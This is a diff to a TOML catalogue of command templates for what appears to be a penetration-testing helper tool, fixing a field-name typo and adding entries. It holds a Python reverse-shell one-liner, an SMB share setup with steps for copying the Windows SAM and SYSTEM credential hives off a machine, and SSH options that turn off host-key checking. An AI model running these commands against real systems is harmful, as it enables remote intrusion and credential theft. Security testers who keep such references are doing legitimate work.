@@ -75,7 +75,7 @@ examples = [
 name_exe = "pwsh-preview"
 cmd_types = "misc"
 args = "-c '[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"<command>\"))'"
-explaination = """
+explanation = """
 Convert command to Base64String with PowerShell.
 """
 examples = [
@@ -86,11 +86,26 @@ examples = [
 name_exe = "ssh"
 cmd_types = "network"
 args = "-o 'UserKnownHostsFile=/dev/null' -o 'StrictHostKeyChecking=no' -o 'Loglevel=QUIET' <conn|user@127.0.0.1>"
-explaination = """
+explanation = """
 Connect with SSH without saving nor checking known host.
 """
 examples = [
     "ssh -o 'UserKnownHostsFile=/dev/null' -o 'StrictHostKeyChecking=no' -o 'Loglevel=QUIET' user@127.0.0.1"
+]
+
+[command.SMBConnect]
+name_exe = "smbserver.py"
+cmd_types = "network"
+args = "<share_name|test> <share_path|/tmp/share/> -smb2support  -username <user|user> -password <password|password>"
+explanation = """
+From the Windows computer:
+
+net use \\\\127.0.0.1\\test /user:test test
+copy SAM \\\\127.0.0.1\\test\\SAM
+copy SYSTEM \\\\127.0.0.1\\test\\SYSTEM
+"""
+examples = [
+    "sudo smbserver.py test /tmp/share/ -smb2support  -username test -password test"
 ]
 
 
@@ -149,6 +164,17 @@ explanation = "Connect to a mysql database"
 args = "-u <username|root> -p<password> -P <port|3306> --host <ip|127.0.0.1> <dbname>"
 examples = [
     "mysql -u root -p user -P pass --host 127.0.0.1 bddname"
+]
+
+[command.Windows-Service]
+name_exe = "Get-CimInstance"
+cmd_types = "sysadmin"
+explanation = "List All Windows Services"
+args = "-ClassName win32_service | Select PathName,Name,State,StartName,StartMode"
+examples = [
+    "Get-CimInstance -ClassName win32_service | Select PathName,Name,State,StartName,StartMode",
+    "Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.State -like 'Running'}",
+    "Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}"
 ]
 
 
@@ -406,7 +432,7 @@ examples = [
 [command.ConnectBack]
 name_exe = "python3"
 cmd_types = "pentest|network"
-explaination = "Connect back and spawn a clean terminal with python subprocess"
+explanation = "Connect back and spawn a clean terminal with python subprocess"
 args = "-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\" <ip|127.0.0.1> \", <port|4444> ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 examples = [
     "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
